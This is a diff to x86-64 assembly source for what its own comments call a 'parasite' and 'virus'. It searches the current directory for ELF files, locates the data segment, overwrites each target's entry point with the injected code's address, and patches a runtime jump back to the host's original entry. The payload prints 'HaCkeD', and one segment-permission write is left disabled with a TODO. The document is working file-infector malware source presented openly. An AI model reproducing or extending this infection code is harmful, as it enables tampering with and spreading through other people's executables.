@@ -25,9 +25,21 @@
 ; int close(int fd);
 ;	osef
 
-global _start
 
 section .text
+	global _start
+
+_start:
+_parasiteStart:
+	; # BEGIN OF PARASITE CODE, MAIN FUNC
+	push 0x2E ; FOLDER TO PARSE '.'
+	lea rdi, [rsp] ; GET POINTER STACK ADDRESS FOR OUR PATHNAME
+	call search
+	;call _code
+	mov rax, 60
+	mov rdi, 0
+	syscall
+	ret
 
 set_mark:
 	; # PROLOGUE
@@ -153,8 +165,8 @@ _segloop:
 	add qword[rbp-44], rax ; injected_address = Phdr->p_vaddr + Phdr->p_memsz;
 
 	; # SET EXECUTE FLAG FOR DATA SEG
-	; # LSEEK SYSCALL
-	; # CALCULATE FLAG_OFFSET
+	; LSEEK SYSCALL
+	; CALCULATE FLAG_OFFSET
 	mov rsi, qword[rbp-8] ; PHDR_START
 	add rsi, r8 ; ADD TO PHDR_START OUR CURRENT STRUCT
 	add rsi, 0x04 ; ADD 0x4 TO GET FLAG OFFSET Phdr->p_flags
@@ -163,19 +175,44 @@ _segloop:
 	mov rax, 8 ; LSEEK KERNEL CODE
 	mov rdx, 0 ; SEEK_SET
 	syscall
-	; # WRITE SYSCALL
+	; WRITE SYSCALL
 	mov rax, 1 ; WRITE KERNEL CODE
 	mov rdi, r9 ; FD
 	push 0x00000007 ; RWE FLAG VALUE
 	lea rsi, [rsp]
 	mov rdx, 4 ; sizeof(uint32_t)
+	;syscall ; #TODO: Re-enable later
+	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE
+
+	; # SET ENTRY POINT AT END OF DATA SEG
+	; LSEEK SYSCALL
+	mov rdi, r9 ; FD
+	mov rsi, 0x18 ; OFFSET FOR ENTRY POINT
+	mov rax, 8 ; LSEEK KERNEL CODE
+	mov rdx, 0 ; SEEK_SET
+	syscall
+	; WRITE SYSCALL
+	mov rax, 1 ; WRITE KERNEL CODE
+	mov rdi, r9 ; FD
+	push qword[rbp-44] ; INJECTED_ADDRESS
+	lea rsi, [rsp]
+	mov rdx, 8 ; sizeof(uint64_t)
 	syscall
 	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE
 
-	mov rax,rax ; # FOR DEBUG, REMOVE AFTER
-	; int 3
+	; # REDIRECT OUR VIRUS TO HOST ENTRY POINT
+	; WRITE SYSCALL
+	mov rax, [rbp-44] ; DIFFERENCE BETWEEN INJECTED_ADDRESS & HOST_ENTRY
+	sub rax, [rbp-24]
+	add rax, _parasiteEnd - _parasiteStart ; ADD PARASITE LENGTH TO DIFF
+	neg rax ; NEGATE DIFFERENCE FOR RELATIVE JUMP, WE JUMP BACKWARD
+	mov dword[_parasiteEnd-4], eax
+	; REDIRECTING OUR VIRUS BY MODIFYING THE CODE AT RUNTIME, INSANE !
 
-	; # CALCULATE INJECTED_ADDRESS
+	; # INCREASE DATA SEG SIZE
+
+	; mov rax,rax ; # FOR DEBUG, REMOVE AFTER
+	; int 3 ; # SIG FOR DEBUG, REMOVE AFTER
 
 _segIterate:
 	add r8, 0x38 ; GO TO NEXT PHDR_STRUCT
@@ -338,57 +375,50 @@ _parseEnd:
 	pop rbp ; CLEAN THE STACK, REMOVE OUR RBP BACKUP NOW THAT WE REASSIGNED IT
 	ret ;
 
-code:
-	; # PROLOGUE
-	; # STACK
-	push rbp ; PUSH rbp IN STACK SO WE CAN KEEP A BACKUP OF OLD STACK BASE ADDRESS
-	mov rbp, rsp ; ALIGN RBP TO RSP
-	; # REGISTERS
-	push rsi ; BACKUPS
-	push rdx ;
-	push rdi ;
-	push rax ;
-	; ##########
-	; # BODY
-	; __________
-	; Can't push 64bits with PUSH so must use MOV then push
-	mov rax, 0x030A44656b436148 ; # HaCkeD
+_code:
+	; # SAVE REGS
 	push rax
-	; __________
+	push rbx
+	push rcx
+	push rdx
+	push rsi
+	push rdi
+	push r8
+	push r9
+	push r10
+	push r11
+	push r12
+	push r13
+	push r14
+	push r15
+
+	; # PAYLOAD
+	mov rax, 0x030A44656b436148 ; #HaCkeD\n
+	push rax
 	lea rsi, [rsp]
 	mov rax, 1
 	mov rdi, 1
 	mov rdx, 7
 	syscall
-	; ##########
-	; # EPILOGUE
-	; # REGISTERS
 	pop rax
-	pop rax
+
+	; # RESTORE REGS
+	pop r15
+	pop r14
+	pop r13
+	pop r12
+	pop r11
+	pop r10
+	pop r9
+	pop r8
 	pop rdi
-	pop rdx
 	pop rsi
-	; # STACK
-	mov rsp, rbp ; SET THE CURRENT STACK POINTER POINTING TO OUR SAVED RBP
-	pop rbp ; CLEAN THE STACK, REMOVE OUR RBP BACKUP NOW THAT WE REASSIGNED IT
-	ret ;
+	pop rdx
+	pop rcx
+	pop rbx
+	pop rax
 
-_start:
-	push 0x2E ; FOLDER TO PARSE '.'
-	lea rdi, [rsp] ; GET POINTER STACK ADDRESS FOR OUR PATHNAME
-	call search
-	; # PARSE_DIR
-	call code
-	mov rax, 60
-	mov rdi, 0
-	syscall
+	; # JUMP
+	jmp -0x1050 ; RELATIVE JUMP WILL BE MODIFIED AT RUNTIME, INSANE !
 
-_debugPrint:
-	; #### DEBUG_PRINT #####
-	push 0x484848
-	lea rsi, [rsp]
-	mov rax, 1
-	mov rdi, 1
-	mov rdx, 3
-	syscall
-	; ####################
+_parasiteEnd:
